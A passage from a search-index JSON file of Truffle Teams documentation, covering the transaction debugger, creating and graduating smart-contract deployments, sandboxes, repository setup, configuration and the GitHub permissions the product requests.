(\"o\" or \"F10\") Step Into - steps into the function call or contract creation currently being evaluated (\"i\" or \"F11\") Step Out - steps out of the currently running function (\"u\" or \"Shift+F11\") Restart - restarts the debugger session (\"r\")","title":"Debugger control palette"},{"location":"docs/teams/debugger/using-the-debugger.html#source-files","text":"The source files that will be accessed as part of the transactions execution path will be represented by tabs with the contract file names. It's worth noting that it's likely your project may contain more files than are displayed here. The Truffle Teams Debugger Source File Tabs. There are two noteworthy visual cues with the debugger tabs. The first is that of an \"open tab\", which means that you're looking at the file's code below and is represented with a light green background. The second is that of \"active tab\" which is represented by an orange circle which indicates that the debugger is currently paused within this file. As you use the debugger's controls to step through a transaction you will likely see the active tab update. Note that the open tab will also update when the code steps into it.","title":"Source files"},{"location":"docs/teams/debugger/using-the-debugger.html#debugger-source-viewport","text":"As the core of the Truffle Teams Debugger is the source viewport. This is a read-only display of the code that the transaction will be stepping through as part of its execution. The Truffle Teams Debugger Source Viewport. The main thing to note is the active line which is highlighted in yellow. As your step through your transaction this will update accordingly.","title":"Debugger source viewport"},{"location":"docs/teams/debugger/using-the-debugger.html#debugger-variable-inspector","text":"The variable inspector shows the variable values for the current transaction execution context, including contract state, local function, and global variables. The inspector uses a tree-like explorer enabling you to drill down by clicking on a given branch, represented by the green right-facing caret icon . The Truffle Teams Debugger Variable Inspector.","title":"Debugger variable inspector"},{"location":"docs/teams/debugger/using-the-debugger.html#breakpoints","text":"Located in the lower right corner of the screen is the breakpoint tray. Breakpoints are added to the tray by clicking on a given line number or just to the left in the line's \"gutter\". They can subsequently be removed by clicking in the same location or on the circular cross to the right of the breakpoint entry in the tray itself. The Truffle Teams Debugger Breakpoints. Functionally, breakpoints will cause code execution to stop (or break) upon being reached. At this point it's common to inspect state via the Variable Inspector or continue stepping through to ensure your code is behaving as expected or when tracking down a bug. Lastly, note that clicking on a given breakpoint within the tray will jump you to the corresponding tab and line. This is particularly useful when navigating more complex contracts that comprise of multiple files.","title":"Breakpoints"},{"location":"docs/teams/debugger/using-the-debugger.html#status-messages","text":"If your transaction's execution ultimately fails, a banner appear after the REVERT happens. An associated status message or reason string will be shown if one exists. The Truffle Teams Debugger Status Message. As shown in the example, the transaction failed with the ERC721: token already minted reason string.","title":"Status Messages"},{"location":"docs/teams/deployments/archiving-a-deployment.html","text":"Archiving a deployment \u00b6 No longer need a particular deployment? To archive a deployment, go to DEPLOYMENTS . Depending on which view you are using the steps can vary: cards or table . Cards view \u00b6 If you're using the CARDS view, click on the 3 vertical dots of your chosen deployment, select ARCHIVE , and confirm the archival. Table view \u00b6 If you're using the TABLE view, click on the ACTIONS dropdown of your chosen deployment, select Archive , and confirm the archival. List of actions available per deployment Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet.","title":"Teams | Archiving a deployment"},{"location":"docs/teams/deployments/archiving-a-deployment.html#archiving-a-deployment","text":"No longer need a particular deployment? To archive a deployment, go to DEPLOYMENTS . Depending on which view you are using the steps can vary: cards or table .","title":"Archiving a deployment"},{"location":"docs/teams/deployments/archiving-a-deployment.html#cards-view","text":"If you're using the CARDS view, click on the 3 vertical dots of your chosen deployment, select ARCHIVE , and confirm the archival.","title":"Cards view"},{"location":"docs/teams/deployments/archiving-a-deployment.html#table-view","text":"If you're using the TABLE view, click on the ACTIONS dropdown of your chosen deployment, select Archive , and confirm the archival. List of actions available per deployment Be careful when using the archive feature; we haven't implemented a way to unarchive deployments yet.","title":"Table view"},{"location":"docs/teams/deployments/contract-monitoring.html","text":"Contract monitoring \u00b6 Truffle Teams monitors your deployments for new transactions. You can view these transactions by going to the detail page for the respective deployment. You can either view all the associated transactions at once or only the transactions for a specific contract . Viewing all associated transactions \u00b6 Click the TRANSACTIONS tab to see all transactions for all associated contracts List of all transactions for a specific deployment Viewing transactions for a specific contract \u00b6 Click the CONTRACTS tab and click MONITOR to see contracts for a specific contract. List of all transactions for a specific contract","title":"Teams | Contract monitoring"},{"location":"docs/teams/deployments/contract-monitoring.html#contract-monitoring","text":"Truffle Teams monitors your deployments for new transactions. You can view these transactions by going to the detail page for the respective deployment. You can either view all the associated transactions at once or only the transactions for a specific contract .","title":"Contract monitoring"},{"location":"docs/teams/deployments/contract-monitoring.html#viewing-all-associated-transactions","text":"Click the TRANSACTIONS tab to see all transactions for all associated contracts List of all transactions for a specific deployment","title":"Viewing all associated transactions"},{"location":"docs/teams/deployments/contract-monitoring.html#viewing-transactions-for-a-specific-contract","text":"Click the CONTRACTS tab and click MONITOR to see contracts for a specific contract. List of all transactions for a specific contract","title":"Viewing transactions for a specific contract"},{"location":"docs/teams/deployments/creating-a-deployment.html","text":"Creating a deployment \u00b6 Currently Truffle Teams supports deployments to Ethereum testnets, Ethereum Mainnet, and sandboxes with support for more target networks over time. Creating a deployment slightly differs depending on which view you have selected for the DEPLOYMENTS page. The general process is as follows: Choose a commit to deploy Select network and connect wallet Select a deployment context Start deployment Finalize deployment Choose a commit to deploy \u00b6 This step can differ slightly depending on which deployments view you are using, cards or table . Cards view \u00b6 To begin a deployment, press DEPLOY on the build you'd like to deploy. You can also click NEW DEPLOYMENT . The deployment wizard modal will pop-up and walk you through the deployment process. Table view \u00b6 For the TABLE view, you'll select a build to deploy from within the deployment wizard. To start a deployment, click NEW DEPLOYMENT , this will open the deployment wizard modal. From the Build to Deploy dropdown, select which build to deploy. Deployment wizard Select network and connect wallet \u00b6 Within the deployment wizard, select a Destination Network , if your wallet has already been setup you can move on to the Select a deployment context step. If your wallet has not been setup, you'll be able to see and click on the CONNECT WALLET button. Deployment wizard MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to the destination network. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask. Select a deployment context \u00b6 Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment , or selet a previous deployment to migrate against. Deployment Context : This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate . Start deployment \u00b6 Now you should be able to see and click on OK, START DEPLOYING to begin your deployment! Be Aware : From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press Confirm to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized. Finalize deployment \u00b6 After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push GREAT! GO BACK TO WORKFLOW or the X in the wizard. If you're using the CARDS view, you should now see a new card under the Staging column. If you're using the TABLE view, the new deployment will appear in the first row. For more information check out the Deployment details section of our documentation.","title":"Teams | Creating a deployment"},{"location":"docs/teams/deployments/creating-a-deployment.html#creating-a-deployment","text":"Currently Truffle Teams supports deployments to Ethereum testnets, Ethereum Mainnet, and sandboxes with support for more target networks over time. Creating a deployment slightly differs depending on which view you have selected for the DEPLOYMENTS page. The general process is as follows: Choose a commit to deploy Select network and connect wallet Select a deployment context Start deployment Finalize deployment","title":"Creating a deployment"},{"location":"docs/teams/deployments/creating-a-deployment.html#choose-a-commit-to-deploy","text":"This step can differ slightly depending on which deployments view you are using, cards or table .","title":"Choose a commit to deploy"},{"location":"docs/teams/deployments/creating-a-deployment.html#cards-view","text":"To begin a deployment, press DEPLOY on the build you'd like to deploy. You can also click NEW DEPLOYMENT . The deployment wizard modal will pop-up and walk you through the deployment process.","title":"Cards view"},{"location":"docs/teams/deployments/creating-a-deployment.html#table-view","text":"For the TABLE view, you'll select a build to deploy from within the deployment wizard. To start a deployment, click NEW DEPLOYMENT , this will open the deployment wizard modal. From the Build to Deploy dropdown, select which build to deploy. Deployment wizard","title":"Table view"},{"location":"docs/teams/deployments/creating-a-deployment.html#select-network-and-connect-wallet","text":"Within the deployment wizard, select a Destination Network , if your wallet has already been setup you can move on to the Select a deployment context step. If your wallet has not been setup, you'll be able to see and click on the CONNECT WALLET button. Deployment wizard MetaMask will pop up asking you to login (if you haven't already). Then you will need to press Connect to confirm the connection with Truffle Teams. If the wizard hasn't changed (i.e. you don't see a button to start deploying), you likely need to switch your MetaMask network to the destination network. This may reload the page; if this happens, you'll need to repeat the steps above. Before moving on, make sure you have the correct account selected in MetaMask.","title":"Select network and connect wallet"},{"location":"docs/teams/deployments/creating-a-deployment.html#select-a-deployment-context","text":"Now you should see the wizard prompting for a Deployment Context . Leave it set to Create a New Deployment , or selet a previous deployment to migrate against. Deployment Context : This option will let you select an existing deployment on the same network that you'd like to use the deployed artifacts for. Truffle supports the concept of migrating your application and will only run the new migration scripts from the last deployment (a.k.a. the deployment context). This becomes useful in a handful of scenarios: maybe you added an extra contract to work with your existing deployment, your Truffle project uses proxy contracts to upgrade your contracts, and more. Technically speaking, selecting the Deployment Context will put the Truffle artifacts from the deployment context you selected in the directory before running truffle migrate .","title":"Select a deployment context"},{"location":"docs/teams/deployments/creating-a-deployment.html#start-deployment","text":"Now you should be able to see and click on OK, START DEPLOYING to begin your deployment! Be Aware : From here on, it's important that you don't close the tab, refresh the page, or lose network connection. We're working on a more robust experience that will enable you to pick up unfinished deployments, but for now our current version requires the tab to stay open and connected. Truffle Teams will only process so many deployments at the same time, so you may see that your deployment has been queued. You'll have to wait (without closing/refreshing the tab) for your deployment to get to the front of the list. However, we're working diligently to make this experience more seamless going forward. Once your deployment has started processing, you'll see a list of steps Truffle Teams is doing to prepare for your deployment. Once the preparation steps are complete, you'll see a screen with a list of your migrations being processed. You should also get a pop-up from MetaMask for your first transaction. You'll notice that this interface with MetaMask is like sending a transaction to any other dapp. It's your account that is sending this transaction, and you have complete control of it. Additionally, we highly recommend that you change the GAS FEE to be higher so that your transactions run quicker. For testnets like Ropsten, it's affordable to always select the Fast option. Once you're happy with the transaction gas fee, press Confirm to send your transaction. Once the transaction is confirmed (the timing of confirmations from MetaMask and Truffle Teams may be slightly offset), you'll receive the next transaction. Repeat this process until you see a message that your deployment is being finalized.","title":"Start deployment"},{"location":"docs/teams/deployments/creating-a-deployment.html#finalize-deployment","text":"After a short wait, you'll see a window with your deployment results: Your contracts are deployed! That was easy. Go ahead and push GREAT! GO BACK TO WORKFLOW or the X in the wizard. If you're using the CARDS view, you should now see a new card under the Staging column. If you're using the TABLE view, the new deployment will appear in the first row. For more information check out the Deployment details section of our documentation.","title":"Finalize deployment"},{"location":"docs/teams/deployments/deploying-to-a-sandbox.html","text":"Deploying to a sandbox \u00b6 To deploy to a sandbox, be sure that you have already created a sandbox, or head to the Creating a sandbox section of our documentation for more information. Follow the steps in Creating a Deployment to start a deployment. At the second step, Select network and connect wallet , you'll see the name of your available sandboxes in the Destination Network dropdown. Select sandbox from the list of Destination Networks The Deployment Account section that appears after selecting a sandbox allows you to specify which of the 10 auto-generated accounts to use for the deployment. By selecting one of these accounts, all transactions will automatically be confirmed using the specified account. You can optionally select MetaMask to confirm your own transactions through MetaMask like you would for any other network. Select sandbox account to use for the deployment","title":"Teams | Deploying to a sandbox"},{"location":"docs/teams/deployments/deploying-to-a-sandbox.html#deploying-to-a-sandbox","text":"To deploy to a sandbox, be sure that you have already created a sandbox, or head to the Creating a sandbox section of our documentation for more information. Follow the steps in Creating a Deployment to start a deployment. At the second step, Select network and connect wallet , you'll see the name of your available sandboxes in the Destination Network dropdown. Select sandbox from the list of Destination Networks The Deployment Account section that appears after selecting a sandbox allows you to specify which of the 10 auto-generated accounts to use for the deployment. By selecting one of these accounts, all transactions will automatically be confirmed using the specified account. You can optionally select MetaMask to confirm your own transactions through MetaMask like you would for any other network. Select sandbox account to use for the deployment","title":"Deploying to a sandbox"},{"location":"docs/teams/deployments/deployment-console.html","text":"Deployment console \u00b6 The deployment console is where you can find all of the output from the deployment process. This can be helpful in debugging when a deployment fails or for better understanding of the overall deployment process. To access the deployment console, navigate to the respective deployment details page and click the CONSOLE tab. Deployment console","title":"Teams | Deployment console"},{"location":"docs/teams/deployments/deployment-console.html#deployment-console","text":"The deployment console is where you can find all of the output from the deployment process. This can be helpful in debugging when a deployment fails or for better understanding of the overall deployment process. To access the deployment console, navigate to the respective deployment details page and click the CONSOLE tab. Deployment console","title":"Deployment console"},{"location":"docs/teams/deployments/deployment-details.html","text":"Deployment details \u00b6 From the deployment details page, you can view the associated contracts, addresses, transactions , and deployment console output . Deployment details view Directions for navigating to the deployment detail page differs depending on if you're using the cards or table view for deployments. Cards view \u00b6 To get to the deployment details page, you can click on the deployment name in the Deployment Details section of the deployment card. Deployment card You can also click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses. Table View \u00b6 To view the deployment details page, click on the deployment name under the NAME column. Deployments table","title":"Teams | Deployment details"},{"location":"docs/teams/deployments/deployment-details.html#deployment-details","text":"From the deployment details page, you can view the associated contracts, addresses, transactions , and deployment console output . Deployment details view Directions for navigating to the deployment detail page differs depending on if you're using the cards or table view for deployments.","title":"Deployment details"},{"location":"docs/teams/deployments/deployment-details.html#cards-view","text":"To get to the deployment details page, you can click on the deployment name in the Deployment Details section of the deployment card. Deployment card You can also click on the + Contracts bar on the bottom of the card to see a list of your deployed contracts and their addresses.","title":"Cards view"},{"location":"docs/teams/deployments/deployment-details.html#table-view","text":"To view the deployment details page, click on the deployment name under the NAME column. Deployments table","title":"Table View"},{"location":"docs/teams/deployments/deployments-overview.html","text":"Deployments overview \u00b6 Truffle Teams provides a quick and easy interface for deploying your smart contracts to Ethereum testnets, mainnet, and sandboxes . On the DEPLOYMENTS page, you can toggle between two views: cards and table . Cards view \u00b6 The CARDS view contains three columns: Commits , Staging , and Production . These columns contain your builds available to be deployed as well as any successful deployments. Deployments cards view Builds Column \u00b6 Builds is a list of all the builds that Truffle Teams is processing or has processed. Each will have a status icon to show if the build is in progress, failed, or successful. Builds with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the DEPLOY button in the top right of the commit indicates this. Staging and Production Columns \u00b6 Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) and sandbox deployments. Production contains a list of Mainnet deployments. Table view \u00b6 The TABLE view contains a list of all of your successful deployments, regardless of what network they were deployed to. There is a NETWORK column that indicates which network the deployment was deployed on. Deployments table view","title":"Teams | Deployments overview"},{"location":"docs/teams/deployments/deployments-overview.html#deployments-overview","text":"Truffle Teams provides a quick and easy interface for deploying your smart contracts to Ethereum testnets, mainnet, and sandboxes . On the DEPLOYMENTS page, you can toggle between two views: cards and table .","title":"Deployments overview"},{"location":"docs/teams/deployments/deployments-overview.html#cards-view","text":"The CARDS view contains three columns: Commits , Staging , and Production . These columns contain your builds available to be deployed as well as any successful deployments. Deployments cards view","title":"Cards view"},{"location":"docs/teams/deployments/deployments-overview.html#builds-column","text":"Builds is a list of all the builds that Truffle Teams is processing or has processed. Each will have a status icon to show if the build is in progress, failed, or successful. Builds with a successful icon (a green box with a checkmark, as pictured) will be able to be deployed; the DEPLOY button in the top right of the commit indicates this.","title":"Builds Column"},{"location":"docs/teams/deployments/deployments-overview.html#staging-and-production-columns","text":"Staging contains a list of all testnet (i.e. Ropsten, G\u00f6rli, Rinkeby, and Kovan) and sandbox deployments. Production contains a list of Mainnet deployments.","title":"Staging and Production Columns"},{"location":"docs/teams/deployments/deployments-overview.html#table-view","text":"The TABLE view contains a list of all of your successful deployments, regardless of what network they were deployed to. There is a NETWORK column that indicates which network the deployment was deployed on. Deployments table view","title":"Table view"},{"location":"docs/teams/deployments/external-deployments.html","text":"External deployments \u00b6 If you have created a deployment through a different interface than Truffle Teams, we can still monitor your deployment and contracts using contract artifact files. To create an external deployment, click DEPLOYMENTS , then click EXTERNAL DEPLOYMENT . From there your operating system's file picker will open. Navigate to your project's contract build folder and select the artifacts you wish to upload. You can select more than one at at time. Select the network where this contract is deployed -- we'll attempt to fill in the address from the artifact file. If the address does not auto-fill, but you're sure the correct network is selected, you may need to manually add it. Click NEXT >> once you've confirmed all the data is correct. Truffle Teams will then verify that the contracts exist on the given network at the given addresses. If there are errors shown in this dialog the contracts either exist on a different network or incorrect addresses were given in the last step. Click the CONFIRM >> button to begin uploading the artifacts and hooking up monitoring. Note : Monitoring for external deployments begins once the contract is added to Truffle Teams and does not currently include historical data from before that point.","title":"Teams | External deployments"},{"location":"docs/teams/deployments/external-deployments.html#external-deployments","text":"If you have created a deployment through a different interface than Truffle Teams, we can still monitor your deployment and contracts using contract artifact files. To create an external deployment, click DEPLOYMENTS , then click EXTERNAL DEPLOYMENT . From there your operating system's file picker will open. Navigate to your project's contract build folder and select the artifacts you wish to upload. You can select more than one at at time. Select the network where this contract is deployed -- we'll attempt to fill in the address from the artifact file. If the address does not auto-fill, but you're sure the correct network is selected, you may need to manually add it. Click NEXT >> once you've confirmed all the data is correct. Truffle Teams will then verify that the contracts exist on the given network at the given addresses. If there are errors shown in this dialog the contracts either exist on a different network or incorrect addresses were given in the last step. Click the CONFIRM >> button to begin uploading the artifacts and hooking up monitoring. Note : Monitoring for external deployments begins once the contract is added to Truffle Teams and does not currently include historical data from before that point.","title":"External deployments"},{"location":"docs/teams/deployments/graduating-a-deployment.html","text":"Graduating a deployment \u00b6 If you're happy with a particular deployment, you can graduate that deployment, and use it as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! To graduate a deployment, it depends which view you are using on the DEPLOYMENTS page: cards or table . Cards view \u00b6 Under the Staging column, click on the 3 vertical dots of your chosen deployment. Select the GRADUATE option from the menu to use the same build as the basis of your deployment into Mainnet. After you're done, you'll see a new deployment in the production section. An example graduated deployment Table view \u00b6 If you're using the TABLE view, you can simply click on the ACTIONS dropdown, and click Graduate on the deployment of your choice. List of actions available per deployment","title":"Teams | Graduating a deployment"},{"location":"docs/teams/deployments/graduating-a-deployment.html#graduating-a-deployment","text":"If you're happy with a particular deployment, you can graduate that deployment, and use it as the basis of your deployment into Mainnet. Other than selecting a different network in MetaMask, the steps are the same! To graduate a deployment, it depends which view you are using on the DEPLOYMENTS page: cards or table .","title":"Graduating a deployment"},{"location":"docs/teams/deployments/graduating-a-deployment.html#cards-view","text":"Under the Staging column, click on the 3 vertical dots of your chosen deployment. Select the GRADUATE option from the menu to use the same build as the basis of your deployment into Mainnet. After you're done, you'll see a new deployment in the production section. An example graduated deployment","title":"Cards view"},{"location":"docs/teams/deployments/graduating-a-deployment.html#table-view","text":"If you're using the TABLE view, you can simply click on the ACTIONS dropdown, and click Graduate on the deployment of your choice. List of actions available per deployment","title":"Table view"},{"location":"docs/teams/getting-started/adding-repositories.html","text":"Adding repositories \u00b6 The first time you sign in to Truffle Teams, GitHub will prompt you to install it on one or more repositories. In some cases you may want to add a repository after initial installation. For example, if it's been created after signing up for Truffle Teams. To add a repository to Truffle Teams, navigate to https://my.truffleteams.com . Click LOGIN WITH GITHUB and once you've successfully logged in you'll be redirected to the Truffle Teams home page. Once logged in, you can also click on the Truffle Teams logo in the top right corner of any page to be redirected to the home page. From there you can scroll to the bottom of the page and click ADD REPOSITORY , this will take you to the Truffle Teams GitHub app page where you can select which repositories you would like to add to Teams. The repo selection (home) screen with and without repositories already present. Click Configure to continue configuring Truffle Teams. Next will be a list of repositories with the ones Teams already installed on having a Configure > link. Click one of those repositories of click one without that link to install Truffle Teams onto that repository. Note : You may be prompted for your GitHub password at this point. You'll arrive at the settings page for Truffle Teams. Scroll near the bottom to the section Repository access . Select either All repositories to add all repositories in this account/org to teams or Only select repositories to select individual repositories from the dropdown. Once you've selected one or more repositories, click the green Save button. You'll be redirected to the top of the Truffle Teams settings page for this owner with a confirmation message. You can now navigate back to Truffle Teams to see your newly added repository! Note : Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building. Read more in the Configuration docs .","title":"Teams | Adding repositories"},{"location":"docs/teams/getting-started/adding-repositories.html#adding-repositories","text":"The first time you sign in to Truffle Teams, GitHub will prompt you to install it on one or more repositories. In some cases you may want to add a repository after initial installation. For example, if it's been created after signing up for Truffle Teams. To add a repository to Truffle Teams, navigate to https://my.truffleteams.com . Click LOGIN WITH GITHUB and once you've successfully logged in you'll be redirected to the Truffle Teams home page. Once logged in, you can also click on the Truffle Teams logo in the top right corner of any page to be redirected to the home page. From there you can scroll to the bottom of the page and click ADD REPOSITORY , this will take you to the Truffle Teams GitHub app page where you can select which repositories you would like to add to Teams. The repo selection (home) screen with and without repositories already present. Click Configure to continue configuring Truffle Teams. Next will be a list of repositories with the ones Teams already installed on having a Configure > link. Click one of those repositories of click one without that link to install Truffle Teams onto that repository. Note : You may be prompted for your GitHub password at this point. You'll arrive at the settings page for Truffle Teams. Scroll near the bottom to the section Repository access . Select either All repositories to add all repositories in this account/org to teams or Only select repositories to select individual repositories from the dropdown. Once you've selected one or more repositories, click the green Save button. You'll be redirected to the top of the Truffle Teams settings page for this owner with a confirmation message. You can now navigate back to Truffle Teams to see your newly added repository! Note : Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building. Read more in the Configuration docs .","title":"Adding repositories"},{"location":"docs/teams/getting-started/creating-an-account.html","text":"Creating an Account \u00b6 To start, navigate to https://my.truffleteams.com . Click on LOGIN WITH GITHUB . If you're not already logged in to your GitHub account, Github will prompt you to do so. If you are a member of any organizations other than your personal account, you'll be prompted to select an organization to contiue with installation. Organizations with an existing Truffle Teams installation will have a Configure > link. Next you'll be asked for permission to link Truffle Teams to one or more of your GitHub repositories. Select the repositories you wish to add and click continue. Select either All repositories to add all repositories in this account/organization to teams or Only select repositories to select individual repositories from the dropdown. Note : We can always add a repository later if necessary. See the Adding repositories documentation for more informaiton. Finally, click Install to install Truffle Teams on the selected repositories and be redirected to the Truffle Teams home page where you'll find the list of your repositories. Why do we need certain permissions? Please see the Permissions disclosure section for a full breakdown of why we're asking for each permission.","title":"Teams | Creating an Account"},{"location":"docs/teams/getting-started/creating-an-account.html#creating-an-account","text":"To start, navigate to https://my.truffleteams.com . Click on LOGIN WITH GITHUB . If you're not already logged in to your GitHub account, Github will prompt you to do so. If you are a member of any organizations other than your personal account, you'll be prompted to select an organization to contiue with installation. Organizations with an existing Truffle Teams installation will have a Configure > link. Next you'll be asked for permission to link Truffle Teams to one or more of your GitHub repositories. Select the repositories you wish to add and click continue. Select either All repositories to add all repositories in this account/organization to teams or Only select repositories to select individual repositories from the dropdown. Note : We can always add a repository later if necessary. See the Adding repositories documentation for more informaiton. Finally, click Install to install Truffle Teams on the selected repositories and be redirected to the Truffle Teams home page where you'll find the list of your repositories. Why do we need certain permissions? Please see the Permissions disclosure section for a full breakdown of why we're asking for each permission.","title":"Creating an Account"},{"location":"docs/teams/reference/configuration.html","text":"Configuration \u00b6 Repository structure \u00b6 Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building. Configuring a different location for the Truffle project \u00b6 Truffle Teams doesn't currently support configuring a subfolder folder for the Truffle project, and Truffle Teams doesn't currently support more than one Truffle project. We're evaluating options to give you the ability to configure those. Environment variables & secrets \u00b6 Truffle Teams currently doesn't support injecting environment variables and/or secrets into the build or deployment environments. For Builds, checkout External CI which can enable you use an external CI provider that does have those features with Truffle Teams. Truffle config file \u00b6 Truffle Teams makes some assumptions and modifications to your truffle-config.js (or truffle.js ) configuration file. networks object \u00b6 When deploying, Truffle Teams ignores any user-provided options in the networks object provided in the config file. Truffle Teams replaces it with a single network that is associated to the network you're deploying to. The names used for that network config can be seen below; you can also use this reference in your migration script's network variable. All names are case sensitive. Mainnet Ethereum Network: mainnet Ropsten Ethereum Network: ropsten G\u00f6rli Ethereum Network: goerli Rinkeby Ethereum Network: rinkeby Kovan Ethereum Network: kovan Sandbox Network: Use the name of your Sandbox, except single and double quotation marks are removed. truffles-sandbox => truffles-sandbox Truffle's \"Sandbox\" => Truffles Sandbox","title":"Teams | Configuration"},{"location":"docs/teams/reference/configuration.html#configuration","text":"","title":"Configuration"},{"location":"docs/teams/reference/configuration.html#repository-structure","text":"Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building.","title":"Repository structure"},{"location":"docs/teams/reference/configuration.html#configuring-a-different-location-for-the-truffle-project","text":"Truffle Teams doesn't currently support configuring a subfolder folder for the Truffle project, and Truffle Teams doesn't currently support more than one Truffle project. We're evaluating options to give you the ability to configure those.","title":"Configuring a different location for the Truffle project"},{"location":"docs/teams/reference/configuration.html#environment-variables-secrets","text":"Truffle Teams currently doesn't support injecting environment variables and/or secrets into the build or deployment environments. For Builds, checkout External CI which can enable you use an external CI provider that does have those features with Truffle Teams.","title":"Environment variables &amp; secrets"},{"location":"docs/teams/reference/configuration.html#truffle-config-file","text":"Truffle Teams makes some assumptions and modifications to your truffle-config.js (or truffle.js ) configuration file.","title":"Truffle config file"},{"location":"docs/teams/reference/configuration.html#networks-object","text":"When deploying, Truffle Teams ignores any user-provided options in the networks object provided in the config file. Truffle Teams replaces it with a single network that is associated to the network you're deploying to. The names used for that network config can be seen below; you can also use this reference in your migration script's network variable. All names are case sensitive. Mainnet Ethereum Network: mainnet Ropsten Ethereum Network: ropsten G\u00f6rli Ethereum Network: goerli Rinkeby Ethereum Network: rinkeby Kovan Ethereum Network: kovan Sandbox Network: Use the name of your Sandbox, except single and double quotation marks are removed. truffles-sandbox => truffles-sandbox Truffle's \"Sandbox\" => Truffles Sandbox","title":"networks object"},{"location":"docs/teams/reference/permissions-disclosure.html","text":"Truffle Teams permissions disclosure \u00b6 During installation Truffle Teams asks for various permissions. We respect your data and want to be very clear about why we ask for the following permissions. Repository permissions \u00b6 Read access to code \u00b6 This allows us to list your repositories and read their contents for automated builds. Read access to administration, metadata, and pull requests \u00b6 Reading metadata and pull requests allows Truffle Teams to trigger builds automatically on commits and pull requests. We read administration to show repositories you're a collaborator on in addition to directly owned repositories. Read and Write access to checks \u00b6 We use read and write access to checks so we can have a full event loop for changing the build status displayed in the GitHub UI. User permissions \u00b6 Read access to emails \u00b6 We use this to fetch your username from GitHub.","title":"Teams | Truffle Teams permissions disclosure"},{"location":"docs/teams/reference/permissions-disclosure.html#truffle-teams-permissions-disclosure","text":"During installation Truffle Teams asks for various permissions. We respect your data and want to be very clear about why we ask for the following permissions.","title":"Truffle Teams permissions disclosure"},{"location":"docs/teams/reference/permissions-disclosure.html#repository-permissions","text":"","title":"Repository permissions"},{"location":"docs/teams/reference/permissions-disclosure.html#read-access-to-code","text":"This allows us to list your repositories and read their contents for automated builds.","title":"Read access to code"},{"location":"docs/teams/reference/permissions-disclosure.html#read-access-to-administration-metadata-and-pull-requests","text":"Reading metadata and pull requests allows Truffle Teams to trigger builds automatically on commits and pull requests. We read administration to show repositories you're a collaborator on in addition to directly owned repositories.","title":"Read access to administration, metadata, and pull requests"},{"location":"docs/teams/reference/permissions-disclosure.html#read-and-write-access-to-checks","text":"We use read and write access to checks so we can have a full event loop for changing the build status displayed in the GitHub UI.","title":"Read and Write access to checks"},{"location":"docs/teams/reference/permissions-disclosure.html#user-permissions","text":"","title":"User permissions"},{"location":"docs/teams/reference/permissions-disclosure.html#read-access-to-emails","text":"We use this to fetch your username from GitHub.","title":"Read access to emails"},{"location":"docs/teams/sandboxes/creating-a-sandbox.html","text":"Creating a sandbox \u00b6 Creating a sandbox is as easy as clicking NEW SANDBOX . The Truffle Teams Sandboxes screen. You'll see all the details necessary to start using this sandbox, including the mnemonic and network_id . Want to use sandboxes with Truffle? See the Usage with Truffle documentation.","title":"Teams | Creating a sandbox"},{"location":"docs/teams/sandboxes/creating-a-sandbox.html#creating-a-sandbox","text":"Creating a sandbox is as easy as clicking NEW SANDBOX . The Truffle Teams Sandboxes screen. You'll see all the details necessary to start using this sandbox, including the mnemonic and network_id . Want to use sandboxes with Truffle? See the Usage with Truffle documentation.","title":"Creating a sandbox"},{"location":"docs/teams/sandboxes/destroying-a-sandbox.html","text":"Destroying a sandbox \u00b6 To destroy a sandbox, click DELETE for the desired sandbox. The Truffle Teams Sandboxes screen.","title":"Teams | Destroying a sandbox"},{"location":"docs/teams/sandboxes/destroying-a-sandbox.html#destroying-a-sandbox","text":"To destroy a sandbox, click DELETE for the desired sandbox. The Truffle Teams Sandboxes screen.","title":"Destroying a sandbox"},{"location":"docs/teams/sandboxes/renaming-a-sandbox.html","text":"Renaming a sandbox \u00b6 By default, we generate a random name for each sandbox. To rename a sandbox, first click VIEW/EDIT . You'll see a modal with the sandbox details, including a text input with the name. Fill in the new name you would like and click CONFIRM to save the new name. The sandbox details modal.","title":"Teams | Renaming a sandbox"},{"location":"docs/teams/sandboxes/renaming-a-sandbox.html#renaming-a-sandbox","text":"By default, we generate a random name for each sandbox. To rename a sandbox, first click VIEW/EDIT . You'll see a modal with the sandbox details, including a text input with the name. Fill in the new name you would like and click 